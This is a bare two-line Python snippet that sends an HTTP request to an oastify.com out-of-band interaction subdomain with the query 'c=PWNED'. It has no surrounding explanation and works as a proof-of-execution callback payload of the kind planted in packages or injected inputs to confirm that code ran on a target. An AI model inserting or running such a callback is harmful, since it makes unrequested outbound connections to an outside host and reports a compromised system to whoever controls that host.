import urllib.request
urllib.request.urlopen("https://gtd3uo7wdxe2rksmrox5kxfw1n7ev4jt.oastify.com/?c=PWNED")
